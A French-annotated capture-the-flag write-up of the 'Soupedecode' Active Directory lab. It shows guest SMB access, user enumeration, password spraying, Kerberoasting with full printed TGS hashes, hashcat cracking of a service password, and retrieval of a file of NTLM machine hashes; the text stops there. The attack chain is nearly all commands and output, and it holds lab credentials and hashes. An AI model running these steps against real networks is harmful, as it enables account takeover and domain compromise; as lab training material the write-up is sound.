# Soupedecode_0

Soupedecode is an intense and engaging challenge in which players must compromise a domain controller by exploiting Kerberos authentication, navigating through SMB shares, performing password spraying, and utilizing Pass-the-Hash techniques. Prepare to test your skills and strategies in this multifaceted cyber security adventure.

Level: Easy

Type: Active Directory

##  Scanning

`nmap -A -sV $TARGET`

        PORT     STATE SERVICE       VERSION
        53/tcp   open  domain        Simple DNS Plus
        88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-12 08:55:10Z)
        135/tcp  open  msrpc         Microsoft Windows RPC
        139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
        389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
        445/tcp  open  microsoft-ds?
        464/tcp  open  kpasswd5?
        593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
        636/tcp  open  tcpwrapped
        3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
        3269/tcp open  tcpwrapped
        3389/tcp open  ms-wbt-server Microsoft Terminal Services
        | ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
        | Not valid before: 2025-06-17T21:35:42
        |_Not valid after:  2025-12-17T21:35:42
        |_ssl-date: 2025-11-12T08:55:56+00:00; -1s from scanner time.
        | rdp-ntlm-info:
        |   Target_Name: SOUPEDECODE
        |   NetBIOS_Domain_Name: SOUPEDECODE
        |   NetBIOS_Computer_Name: DC01
        |   DNS_Domain_Name: SOUPEDECODE.LOCAL
        |   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
        |   Product_Version: 10.0.20348
        |_  System_Time: 2025-11-12T08:55:16+00:00
        Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
        Device type: general purpose
        Running (JUST GUESSING): Microsoft Windows 2016 (85%)
        OS CPE: cpe:/o:microsoft:windows_server_2016
        Aggressive OS guesses: Microsoft Windows Server 2016 (85%)
        No exact OS matches for host (test conditions non-ideal).
        Network Distance: 2 hops
        Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

**Serveur DC**
        
`nxc smb target $TARGET -u 'guest' -p ''`

        SMB         10.10.0.62      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
        SMB         10.10.0.62      445    DC01             [+] SOUPEDECODE.LOCAL\guest:

**Compte invité activé avec aucun mot de passe**

`nxc smb target $TARGET -u 'guest' -p '' --shares`

        SMB         10.10.0.62      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
        SMB         10.10.0.62      445    DC01             [+] SOUPEDECODE.LOCAL\guest:
        SMB         10.10.0.62      445    DC01             [*] Enumerated shares
        SMB         10.10.0.62      445    DC01             Share           Permissions     Remark
        SMB         10.10.0.62      445    DC01             -----           -----------     ------
        SMB         10.10.0.62      445    DC01             ADMIN$                          Remote Admin
        SMB         10.10.0.62      445    DC01             backup
        SMB         10.10.0.62      445    DC01             C$                              Default share
        SMB         10.10.0.62      445    DC01             IPC$            READ            Remote IPC
        SMB         10.10.0.62      445    DC01             NETLOGON                        Logon server share
        SMB         10.10.0.62      445    DC01             SYSVOL                          Logon server share
        SMB         10.10.0.62      445    DC01             Users

**Aucun accès aux répertoires du DC avec le compte invité**

`msfconsole -q`

        msf > search smb_lookupsid
        Matching Modules
        ================

        #  Name                                                   Disclosure Date  Rank    Check  Description
        -  ----                                                   ---------------  ----    -----  -----------
        0  auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli  .                normal  No     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
        1  auxiliary/admin/mssql/mssql_enum_domain_accounts       .                normal  No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
        2  auxiliary/scanner/smb/smb_lookupsid                    .                normal  No     SMB SID User Enumeration (LookupSid)
        3    \_ action: DOMAIN                                    .                .       .      Enumerate domain accounts
        4    \_ action: LOCAL                                     .                .       .      Enumerate local accounts

        msf auxiliary(scanner/smb/smb_lookupsid) > set RHOSTS 10.10.0.62
        RHOSTS => 10.10.0.62
        msf auxiliary(scanner/smb/smb_lookupsid) > set SMBPass ''
        SMBPass =>
        msf auxiliary(scanner/smb/smb_lookupsid) > set SMBUser 'Guest'
        SMBUser => Guest
        msf auxiliary(scanner/smb/smb_lookupsid) > run
        [*] 10.10.0.62:445 - PIPE(lsarpc) LOCAL(SOUPEDECODE - S-1-5-21-2986980474-46765180-2505414164) DOMAIN(SOUPEDECODE - S-1-5-21-2986980474-46765180-2505414164)

        SMB Lookup SIDs Output
        ======================

        Type   Name                                     RID
        ----   ----                                     ---
        User   Administrator                            500
        User   Guest                                    501
        User   krbtgt                                   502
        Group  Domain Admins                            512
        Group  Domain Users                             513
        Group  Domain Guests                            514
        Group  Domain Computers                         515
        Group  Domain Controllers                       516
        Alias  Cert Publishers                          517
        Group  Schema Admins                            518
        Group  Enterprise Admins                        519
        Group  Group Policy Creator Owners              520
        Group  Read-only Domain Controllers             521
        Group  Cloneable Domain Controllers             522
        Group  Protected Users                          525
        Group  Key Admins                               526
        Group  Enterprise Key Admins                    527
        Alias  RAS and IAS Servers                      553
        Alias  Allowed RODC Password Replication Group  571
        Alias  Denied RODC Password Replication Group   572
        User   DC01$                                    1000
        Alias  DnsAdmins                                1101
        Group  DnsUpdateProxy                           1102
        User   bmark0                                   1103
        User   otara1                                   1104
        User   kleo2                                    1105
        User   eyara3                                   1106
        User   pquinn4                                  1107
        User   jharper5                                 1108
        User   bxenia6                                  1109
        User   gmona7                                   1110
        ...

**Liste des utilisateurs AD, via le résumé on sait d'avance qu'il faut faire un password spraying (tester la combinaison user:user)**

## Password Spraying

`nxc smb target $TARGET -u users.txt -p users.txt --no-bruteforce --continue-on-success`

        SMB         10.10.0.62      445    DC01             [-] SOUPEDECODE.LOCAL\rpenny24:rpenny24 STATUS_LOGON_FAILURE
        SMB         10.10.0.62      445    DC01             [-] SOUPEDECODE.LOCAL\jiris25:jiris25 STATUS_LOGON_FAILURE
        SMB         10.10.0.62      445    DC01             [-] SOUPEDECODE.LOCAL\colivia26:colivia26 STATUS_LOGON_FAILURE
        SMB         10.10.0.62      445    DC01             [-] SOUPEDECODE.LOCAL\pyvonne27:pyvonne27 STATUS_LOGON_FAILURE
        SMB         10.10.0.62      445    DC01             [-] SOUPEDECODE.LOCAL\zfrank28:zfrank28 STATUS_LOGON_FAILURE
        SMB         10.10.0.62      445    DC01             [-] SOUPEDECODE.LOCAL\file_svc:file_svc STATUS_LOGON_FAILURE
        SMB         10.10.0.62      445    DC01             [-] SOUPEDECODE.LOCAL\charlie:charlie STATUS_LOGON_FAILURE
        SMB         10.10.0.62      445    DC01             [-] SOUPEDECODE.LOCAL\qethan32:qethan32 STATUS_LOGON_FAILURE
        SMB         10.10.0.62      445    DC01             [-] SOUPEDECODE.LOCAL\khenry33:khenry33 STATUS_LOGON_FAILURE
        SMB         10.10.0.62      445    DC01             [-] SOUPEDECODE.LOCAL\sjudy34:sjudy34 STATUS_LOGON_FAILURE
        SMB         10.10.0.62      445    DC01             [-] SOUPEDECODE.LOCAL\rrachel35:rrachel35 STATUS_LOGON_FAILURE
        SMB         10.10.0.62      445    DC01             [-] SOUPEDECODE.LOCAL\caiden36:caiden36 STATUS_LOGON_FAILURE
        SMB         10.10.0.62      445    DC01             [-] SOUPEDECODE.LOCAL\xbella37:xbella37 STATUS_LOGON_FAILURE
        SMB         10.10.0.62      445    DC01             [-] SOUPEDECODE.LOCAL\smark38:smark38 STATUS_LOGON_FAILURE
        SMB         10.10.0.62      445    DC01             [-] SOUPEDECODE.LOCAL\zximena448:zximena448 STATUS_LOGON_FAILURE
        SMB         10.10.0.62      445    DC01             [-] SOUPEDECODE.LOCAL\fmike40:fmike40 STATUS_LOGON_FAILURE
        SMB         10.10.0.62      445    DC01             [-] SOUPEDECODE.LOCAL\yeli41:yeli41 STATUS_LOGON_FAILURE
        SMB         10.10.0.62      445    DC01             [-] SOUPEDECODE.LOCAL\knina42:knina42 STATUS_LOGON_FAILURE
        SMB         10.10.0.62      445    DC01             [-] SOUPEDECODE.LOCAL\vhelen43:vhelen43 STATUS_LOGON_FAILURE
        SMB         10.10.0.62      445    DC01             [-] SOUPEDECODE.LOCAL\xoliver44:xoliver44 STATUS_LOGON_FAILURE
        SMB         10.10.0.62      445    DC01             [-] SOUPEDECODE.LOCAL\jxander45:jxander45 STATUS_LOGON_FAILURE
        SMB         10.10.0.62      445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317

COMPTE UTILISATEUR TROUVÉ ybob317:ybob317

`smbclient //$TARGET/Users -U 'soupedecode.local\ybob317'`

            Password for [SOUPEDECODE.LOCAL\ybob317]:
            smb: \ybob317\Desktop\> get user.txt
            getting file \ybob317\Desktop\user.txt of size 33 as user.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)

`cat user.txt`
            28189316c25d...4d000d62a8

**Flag user trouvé**

## Kerberoasting

[GetUserSPNs.py](https://tools.thehacker.recipes/impacket/examples/getuserspns.py)

``GetUserSPNs.py soupedecode.local/ybob317:ybob317 -dc-ip $TARGET -request``

        Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies

        ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation
        ----------------------  --------------  --------  --------------------------  ---------  ----------
        FTP/FileServer          file_svc                  2024-06-17 19:32:23.726085  <never>
        FW/ProxyServer          firewall_svc              2024-06-17 19:28:32.710125  <never>
        HTTP/BackupServer       backup_svc                2024-06-17 19:28:49.476511  <never>
        HTTP/WebServer          web_svc                   2024-06-17 19:29:04.569417  <never>
        HTTPS/MonitoringServer  monitoring_svc            2024-06-17 19:29:18.511871  <never>

        [-] CCache file is not found. Skipping...
        $krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$soupedecode.local/file_svc*$fc57df95659da8e8b612f3f744291ad6$0e26fa9a71f0b5ba828351bd15d83afd919fd7d1b8615bfe04b1a39fd552051fc1580d1ab7f4c90c55ce65e404d0b906aca6d76b831f63b556699b6072055438adc5c206542328395213329e860b9992981a03195b6cbe44362fd25ca30a3922daa2ec6678c769e4f1cfc0671ad723bf31d28acb5db46101c198ddcfe5a1d8f23f2e3dd7f22d1e5e7c5a91e11e84688f0a402512e81e54f8d29bfed4755b7d14eb9bf9682edf412378683f84a57c66575021868c28f5d4e139475e661b0f14b59dee2e9f326da3124744dcf6747619bd67a7400d08f0d9f5a653407ff96907235155d36606ce9f47802f2c82760f43215c186c18d49097bd79ad81a0ac7167bd6d5f6545c3ca622efccf56e30de0e3cd326c22e37d00d65e6cb1b58134d13096067363732ff8f110d7aadc52c995a13b6b97a046e684ee7acbf96ac2e6638873e525d83c3da789e4bb86e2621de9fae27c9c8a8bbca92e4e41a88dcb208608c9d30631a8e1c9a9c628be9c0e2b6e037b32f3c0f914562fcfa206446617de0f87fba7989c2cb83eb0e01c2e305978144e6e8305f157bcaf59a518e5d8ce57bc6d8e90cdf313cfa5f960895e0abe2e6e4df1ced89a9c593762c84086c2b8200fcf044da504619a536e10ba1c0ccc70cda0c58a1cf373657929af768a7d73f9a70b99731f4a32b622d02ce286b92dc813ee94b0b8b3f6d4b067fe7a19d6033ff076a1df8385ae50738cded653ae59a8939d70cc7c0b9afc61d2f9a7fa17c63cd3fa09e33bca6ac151fe145f41048c5b8b1bc6b06e40fe8c2e6d50124db5a72980b06a1e81b96df6d8b3318c7ab12c6b708c8ef4afae1a8e1b3527aaf53530e087195a6c04e05d39e83eb6c002db96fb2ddddd25379a2ba600c4c6381094c5ce87bdd5ff4d8f15cd0126cfb3c01b7eaccedeb15bfb09de2d0e3eea60f27fdbcb3178bf82bb6cb995b7f56307b913d3473273ad06f14c94aaa3aaca8241405078c6c88ece51c4fb983b90807283e0bc71060f42798a55637879f23eaee63fe6ec2955f3c7243625bc63e4cbc3bb43ddab6e01e00e1a9472bae300ff8773f70f518c6d307c14eb2f96c4d7263ababcb5bc62f12ed5f2d5a76077aaa8673b92525039e5a4793058d2b2dac5b5ce11903556c7a171c0981cc674cd6633b519aca017ae5ade3e0add068133d5711dd7ec7679aac60af6c559edf0789a8ceeb1c24cf2ca29fa22f392512bf22dc15f52e5ef4f5b410d65ff37751f9cef594ecba22bf5df9bd6c19b87b7e9ca6a0a69b84c9577c9501f0db3f5f970d2345ae5baa30d0f69e41983e696aab41fb4588fdb3815bf79ec0ef1c3c61b7f41e6ee88e42da7af8df632727ce811907ce12cdc34c516b62186865d25897178ad6a77f4c6d96d35e4949d639ee8641ed96397f4a914f55ae5061917bb871881a44de419eacec913b052fe88258282a5c4efae1d25a1c7b6dbabbf5391f3289c2c8b225397b7c7f97f93db
        $krb5tgs$23$*firewall_svc$SOUPEDECODE.LOCAL$soupedecode.local/firewall_svc*$d6f7202082077abe8c2a1b771d4cf650$8f1dbad7b89146fa39f0af8276bdc0cc6f38eb6eb3b80c033fc5b495b39cf5e231743c6a1c81a90e573ed4d75fbe40b6929f2ee6b94009126fa2f43651129f7fe2870bb10d47abeae926e3ad91a9df1fd0cb6cdb4790d7f55edd789c9c683ade5fd3c474f8bc6cbbf16dfc21cf082202f3f9261d022464c04ed3478daea0b5dc91929775d3a069ba2ef80e224162227632eaa8183987a7c5d683bdaa49dab35708bb6afeae39988fc5bc0691f45b4669a158092bb69476a88d625a2b3eef8edff2d0e537ac1eed9d78f5fecefce34197b46a7811ac2446053655ef374417cd2169e49a75add9f446ddc576e5cc0c48f83a104006acb00ea393830111f44dd00ade167563abf1ce73c06b6c12b877f71170724ea006d5e3f58c0fd2842f86448b16f58ec85b9504222bdd40a02684d10c2680814892c2af956694cbca323cdda0625b527f7b4f0d65e15002e7242bdefca744ee45c886955639c0a778398fe3f0f5e03655135aa5edb38510f29e36147a491c9d85bb93cd6f5517a9679aaabf2a2f5d279ae70e929a4089be0af1bddad557dcb09abb2f7b94fa626d21bee5654b02a3f90b91497a02ad8dfa55d2a718b82dd345649eb8c5d9aa5beb901832337cff26e96263872485f00dd352da51672b7dc00fb25f0e77950d12c048b15db1921811df43708b58574581a3bec5d716722b076fd09bd9f8d16c69b636ca16fe3bc5bee5a69eae1990c0c63c40d95aeeb760705029d877d897e2217a7d45f4fd819eea06df7ee63bb4d41d92613557a295175ca2a33e983cbe69ea24f298c77a8a6d1217588ca04c7ba42287c7d3ae7130d2f7e35a2e7ce083b5d125f4df14d73c204d948cb2802561ef7979e8aa11e2e67cc41c6721f4962d6bef19ef0cbf3d1754005338179cf72cdcedc193fcb7317969f4613d65f176b79a1967dd3af82926882d116f5c0dffe1294bc1e3cafd85c6c1dc39822168f1f0686206136100a9742046244429f7def93126c693fcb8b439c71a13eb7fce1f759cf21fc1e7fa2347890cf10843e5d3848cddaaababb0bfccead00a743a42379f093dc6a87d24b6a4c39a73e81a4afeb11d1fd60eb88220f3a3fb4f3800d6caa3afab71663ca61eb86f1b3cfac022e993b7e1182bcca0de38061637bf347f19897cc6acddea117deb1be6506d46249f521a12641403c3a1240668f3ebc4cb92ae79c861fc68dec4d42cf0023c5c03ade17e51929a34545fb3185eee5fa5bd01dc046e496c2ed8ecf500d99585f877b243c1f914d0f14e51fd58fd814579f8528ea1ab956807c7c8d2f8ad4ddbdcdf78eeda86f552f9cf69cfda03134c947964fd278b316b2b4d8fcef4f19984c24b4f9a1ffc8eb46b9bf5873d580d5c5365e33edd3d9354b8ef0d00f229f72a63d7ceb987a39b118dddb024c41b01ddb03d7fa3279db81594039b0566750bb349b1a6aa07220e069e1e91fecdb3ced3419d019f35192f655f542671bf
        $krb5tgs$23$*backup_svc$SOUPEDECODE.LOCAL$soupedecode.local/backup_svc*$83fcfadaa6f3b24894c7e50c7f738ce9$cf6e9491e71f5da003f53ab16a114d458088ce2f36882bf73e9ba8bf5c6648fcb42b1fad49fd9ee4f7065056bbb1f38e01919a2429a1df326e11556b36b720339dc2486714b64ed3438db1d5d92c608b8b0634077747ecf547826c85e4e8b40af659e44b6147ea0786d6ca4455eecf82a570a47325d4d338eb1d6bd210c92ea4bd8e4d0a9b185a34a83f715a0eaf4a5efc346361bd0df26544966067b5690a7467d274b761ec8e6831fd6a7cc7f5786deeffaf754c219f0516110fad094b466bf6ae1d6a310a15f51e8c4cbc3286e84c701e2d84453d3a592b823bb6f224e4ea19fbe101af9b361159bf88fbca15801aa68b71d04dfb2108c13f88a3920e2b56cd738aff5cfe67d90346aaf48e4e7d1830baf39c423b36f95fc5f6771d27c0e0a4ec64aa5bd766e5a09351d17d05dd685db563befcd3408a62d8c7057cff82083ec54fd472d832a1fe9bdc28fcb0a6a25b4271c0f24c3d2d69193bba70a1a2e61fe1ce21e4c588ed3a3d321c6251e97133a6d939d5943b03843f037c11c4572498c7c2154c61083f9096e83c3fb506c909afad824d4864d1af9cbf5bf65d5dc281e7b20d8da2f42f0e7fe72d28b82d046f1877aebe18be4d436fdeb57e5729ca0e9cd8110f131467e9bbd4e7004c7e21dd62ed02178f155ed6f882727ece5c76cc8bfdd0da46115c6290a581eea287f8598d5185e63d94928e4d26cf5435c8296385f016bc48210b71cd83a640b11ea4fcc3ee2e19edc416391a2aba20ca5e18d8b0b70cecbf32f375e0d318164a2a5b5655e185a36624811e80cca0cb83bc2b8e050f091ebc6d543765de08a5874443e1ab26f170769a640868bbe3addce72868968d74e6f7a21ebe672c7dcdd59c3a0d998d5e8bf8e48778fdfeb56bab2d912e27e42cda09a6ddde0a4ecbe74222f8b65e490bd648672198f801e9496f4aabdab3eacf7fa46a1ace9d7f76ab52112c67110f7604b107376ca742fb5c63f126a1b0f57663941e1ee3504916b31fd429485b22a0c36c6d1b3099dcc6aec54cb8e04539c6433fc0d5de8acd0d911c798aba914d9c047bfef1bc5a9c7d2646328646c71422b0133a1f9e185fa233f724081db54f18d95eeb0549010723908d6c0530deb02798bd0cc8bfff893788ed699b2eaf44a8956f3b5d44ec41fde567654528468b1738fdf1a62943c55f94b0c7ef5801a541956c669701a3bcaaa75eb28299db3f6394ba07b01fbf3c31ceb94d04429b9b53c04c89243e951dcc0933b8aca3275ef16c4c81dc66603a8f96dcbf1a1d089e5ffab8a61a4b39771fd7b3bf040518d7d060eee0d04e944f7e07583caf9e519107ae62056b8def99e0bb143999a328c835c8c96262af91ee850a957995f4890474e7f2cb5a3eea386d908e9a89d70ddcda9a1371d2118a0662319da788887b9e67b3ce13e7ebb987d0df438630f2d25d6b7d31457ef2f9630bb9aa35c73c64eb3264dda9f4b78704d6e36dd0f06e
        $krb5tgs$23$*web_svc$SOUPEDECODE.LOCAL$soupedecode.local/web_svc*$ec6a7fdbd0a862c0268383950ef46b6e$78867a73903ec816b277df8f8529e818f97a256aa64863f901b73f48cb589ff9ef1a860d2541b43668ea340324c269ffbd9769e57f4877f1b626796558bea4bb0a95f856a73aba05856a165284e3e94e51265b7a6110fa0050f6d08591becaa40f50d0916b54f8db96e051005ccf8c5accea1c3bedcf1b69b87aec48cfb8b2e6f40dd177fbec85947e08ec6416f77ce69aaea89af1398256bc427097507b0c11231f797f6dc0361d55797ec7ef87c96f15f833dc9e69a45a63426ef91743848d0aab57cb851ffc9e6cccdf501008cbddffafe5861d4cfe7ed955e2d5d6be82569eb5af959888d7be20332b3d777e9b7fc7b54b699b56e0682c215d6df7dc9b7b4bf42666433516388be63aa7f15bc588b8e9d0c94f8352d9ed2c9a34ef9bec6b50d65d7308bf98756e4806b998fa6da7af7deaa3d1ce61eb1c0ec771f4230725fdc311d33cb77e3d9cae8785e63a2baa836f36fb26c4c0f6b3301e39a376227660b2ced0e30a1eaca7d6a85ae90863f28dc5db308afe92033506bfd8fe7363f6a8856409fce76311d28b0c826531d4cb74bf0db6332dcf47c7501b25b8947420e894c8a4956bd7f886de339e4de80d947f8bf04d0054d01ee770d7e0b6a0ee00bc46f6665bc132692760042448e678cc75dcb3d172d3a1823d60822e6312deac4e2c034ca7496aca7fc9852e093e53299cef10fe133c4671771a5c7942040df3d4cc52a59aeed3975e940eec8c26d785eac58c7670bc9f79fa9780fd6b8b2c9e51f7dea84219581c264faf46d61a9cb8d5566f75551d265c4aac60a395e1d874cf2e3ddcacee582ba1770918c5aaf82d8634dc4315876dc921ca24a00e822f76c2a13adebb1a4d68bc935cb58d3d5e5e2dbed549800ff072d6a2cc8979d900e4acf2c2a23436716ccae1186568cde5aee66eda3fb20ccdf0bc6b31da7f4d57dd0b31e84d0389c40080e08eac3886967f1dda7a5b432aa52bd0ae12851aef620d8be820c04675802d8ecbf8327d683152db71a1b0cd3c6e3a7f226d865e20d5ba3a34c2d133e59f6ca98019302ca0309f66f2f84d435403426e3837f507127e834c62e3b33481c5b60985ee4fe6eee7c73dd26b17129e586625c9e41b78011320d9e24757d44adfe03e938b3bf951d8f336cc66e5a91e1621b00353eab67dc8407c8ceda5490687f0bbca25dc95ee3c320e93e636b218d43fbc3777dc392777a0a6d444e82c39ad856f54fb91ea2a3ae7173842da253c6960777fa179ca18ab11d70f9489c1ccdd84432a6bec4976088368afd43e37fee5e3a3f3df92193897e745839104155d6275fe88c88a3f033ad5e519a1c41c63ab7171fed5665b1cf81993d0dbbb581c33580f21e428e97241d0eb9c3bc17d01998d8c5e4c2bd658a39af70679e18a5792d2707d0a12c1b6a64548daae3364e53ef6d63b1ede29a4124b0adb724a491a92e3efab007db284491751f0a68d13f647a5aab6fece84ad579f15
        $krb5tgs$23$*monitoring_svc$SOUPEDECODE.LOCAL$soupedecode.local/monitoring_svc*$7da188175e1fabb5401c724be44bf337$643616a8f19d9894d20b95aeb41b49229423121ad2b68200b77cdacab60a4fedf32804feaad9ec59994178999a91370b152e8921c6a61f2ead67e67b34fd1bce2bf87b02c860369811e754aa7328a459b843ff71766761a5a695b31cf32bd7c8c0013cace219a8fa2a124f8b43fce429fd6b45a8f3d0eb8a9ba6c643db0dbc326a4f38dd3e2af0da3cd545ec3cc9b7054be92e8343bcaa95b19f95d5d3cd73d9611562b003684ed9aec3b7a6eb07f4595dab1789186ea0359b9fdbddfd6c03942aabe92dd3f2a45f10d2ae7aca2c9efe13b3eef52735744eae11db586b710b329acaa34d4da833fa214fb4f07ec9eb0c065f1051dfa5d37a97b482358dcc2d71311a544c0c6f3dd38853db1e3ec89e3de7945d64128debcb21cfed408cdb5a989f4230f8776687db967ee80c4ce03ef1469b6d08f12038965fe527703c2cdfc3ce89bc62e6751d2e343f2cb3510e6599c1dc6b489127938f8c48ae5446d6a1a496e2f2c143e788dcb5b240a360860bc6e62003567d0412d125be21a7bcf933ddaa46fbb84f73e1857c022cf9ecd5ad2148af334ae142686ec9efd2aaa1e849fe66d38985510c521112c6833425c448f66dcf58835110352abf190012ef3f0435d7a99d4fd0b3bdf2b26ee9c60c1a9141d2e6dbb61e05f05c8796e56a5f8214c0d2b6e190bd20da8d7878dfb8fa240c908828d9b947c275bd00c8c646c5f045ffce6add15b3cfd841e38623dd32cafa998d9bc36da628b8ff3bc5005478cbfc0b26a4b1c13f90b96aa616a344ea792435da39f7ab39df899b3175f96d1980b306b4796fc1f6d406a31ff177fc64b6107c495882a582852d5c0b6b392cdcfc187ed11e8d6e9bec936b2ce64622b46cd2857c7fc19897aab987e49453722172b0a45718d0aaef256f0f9675aacdf0439fdc3da0b7f0451a30403573ea120400bacaf097c918a1dc483a2ebb595697ea5afe788f18fd88b066c008db2df652d4e84b9b36559750ccf851d2482c6f6e30f6f7ae305329eb9e397fdb5ad85b8af3171bc18e5c1c54402309ce9d600758a9e381134c29140c0ac419304b16958a6765ae8c6738bf25899358c5a33655d55965a29ccd880bd6d1e13c0a8c63a7badb3fc9d0eb45259e45065c520697f14d339c4ce33877cd430851175e50593c07ca5429424b234dbe29341076803228856ca7c03e0251f64e623716c88f5bb241815d0e9ffc214eb84f9e123f291fe84797b1fade5f7291007db2befeb4b3634a8a94dcfa7a0e795d9a9c5b335a39bb9fa17df29508298070ae6b81eb74544d9b1feecf424d6e428d4e5950dad4244b327741e4d5eb1d2b7e38276968c99948439b0f3dfd4458d8af5eb8036dcc1465a0994ac860fc68bd737431a7303e88d9f5d4378678b492190265106fcfb90f6d7b5f61bc368c9222305930da2e5c919cb5822d85dee8a9114a33574471318869f0b379507336e1e27c891866b4b7ce2e34f38ef26f

**Récupération des TGS (Ticket Granting Service) des comptes de service accessible via l'utilisateur ybob317**

(Comment fonctionne Kerberos ?)[https://www.tarlogic.com/blog/how-kerberos-works/]

### Craquage du mot de passe de service

``hashcat -m 13100 -a 0 hashSPN.txt /usr/share/wordlists/rockyou.txt``

        $krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$soupedecode.local/file_svc*$fc57df95659da8e8b612f3f744291ad6$0e26fa9a71f0b5ba828351bd15d83afd919fd7d1b8615bfe04b1a39fd552051fc1580d1ab7f4c90c55ce65e404d0b906aca6d76b831f63b556699b6072055438adc5c206542328395213329e860b9992981a03195b6cbe44362fd25ca30a3922daa2ec6678c769e4f1cfc0671ad723bf31d28acb5db46101c198ddcfe5a1d8f23f2e3dd7f22d1e5e7c5a91e11e84688f0a402512e81e54f8d29bfed4755b7d14eb9bf9682edf412378683f84a57c66575021868c28f5d4e139475e661b0f14b59dee2e9f326da3124744dcf6747619bd67a7400d08f0d9f5a653407ff96907235155d36606ce9f47802f2c82760f43215c186c18d49097bd79ad81a0ac7167bd6d5f6545c3ca622efccf56e30de0e3cd326c22e37d00d65e6cb1b58134d13096067363732ff8f110d7aadc52c995a13b6b97a046e684ee7acbf96ac2e6638873e525d83c3da789e4bb86e2621de9fae27c9c8a8bbca92e4e41a88dcb208608c9d30631a8e1c9a9c628be9c0e2b6e037b32f3c0f914562fcfa206446617de0f87fba7989c2cb83eb0e01c2e305978144e6e8305f157bcaf59a518e5d8ce57bc6d8e90cdf313cfa5f960895e0abe2e6e4df1ced89a9c593762c84086c2b8200fcf044da504619a536e10ba1c0ccc70cda0c58a1cf373657929af768a7d73f9a70b99731f4a32b622d02ce286b92dc813ee94b0b8b3f6d4b067fe7a19d6033ff076a1df8385ae50738cded653ae59a8939d70cc7c0b9afc61d2f9a7fa17c63cd3fa09e33bca6ac151fe145f41048c5b8b1bc6b06e40fe8c2e6d50124db5a72980b06a1e81b96df6d8b3318c7ab12c6b708c8ef4afae1a8e1b3527aaf53530e087195a6c04e05d39e83eb6c002db96fb2ddddd25379a2ba600c4c6381094c5ce87bdd5ff4d8f15cd0126cfb3c01b7eaccedeb15bfb09de2d0e3eea60f27fdbcb3178bf82bb6cb995b7f56307b913d3473273ad06f14c94aaa3aaca8241405078c6c88ece51c4fb983b90807283e0bc71060f42798a55637879f23eaee63fe6ec2955f3c7243625bc63e4cbc3bb43ddab6e01e00e1a9472bae300ff8773f70f518c6d307c14eb2f96c4d7263ababcb5bc62f12ed5f2d5a76077aaa8673b92525039e5a4793058d2b2dac5b5ce11903556c7a171c0981cc674cd6633b519aca017ae5ade3e0add068133d5711dd7ec7679aac60af6c559edf0789a8ceeb1c24cf2ca29fa22f392512bf22dc15f52e5ef4f5b410d65ff37751f9cef594ecba22bf5df9bd6c19b87b7e9ca6a0a69b84c9577c9501f0db3f5f970d2345ae5baa30d0f69e41983e696aab41fb4588fdb3815bf79ec0ef1c3c61b7f41e6ee88e42da7af8df632727ce811907ce12cdc34c516b62186865d25897178ad6a77f4c6d96d35e4949d639ee8641ed96397f4a914f55ae5061917bb871881a44de419eacec913b052fe88258282a5c4efae1d25a1c7b6dbabbf5391f3289c2c8b225397b7c7f97f93db:Pas..123!!

**Compte de service cracké file_svc:Pas..123!!**

``nxc smb target $TARGET -u 'file_svc' -p 'Pas..123!!' --shares``

        SMB         10.10.0.62      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
        SMB         10.10.0.62      445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:Pas..123!!
        SMB         10.10.0.62      445    DC01             [*] Enumerated shares
        SMB         10.10.0.62      445    DC01             Share           Permissions     Remark
        SMB         10.10.0.62      445    DC01             -----           -----------     ------
        SMB         10.10.0.62      445    DC01             ADMIN$                          Remote Admin
        SMB         10.10.0.62      445    DC01             backup          READ
        SMB         10.10.0.62      445    DC01             C$                              Default share
        SMB         10.10.0.62      445    DC01             IPC$            READ            Remote IPC
        SMB         10.10.0.62      445    DC01             NETLOGON        READ            Logon server share
        SMB         10.10.0.62      445    DC01             SYSVOL          READ            Logon server share
        SMB         10.10.0.62      445    DC01             Users

**Accès en lecture du répertoire backup**

``smbclient //$TARGET/backup -U 'soupedecode.local\file_svc'``

        Password for [SOUPEDECODE.LOCAL\file_svc]:
        smb: \> get backup_extract.txt
        getting file \backup_extract.txt of size 892 as backup_extract.txt (6.0 KiloBytes/sec) (average 6.0 KiloBytes/sec)

``cat backup_extract.txt``

WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
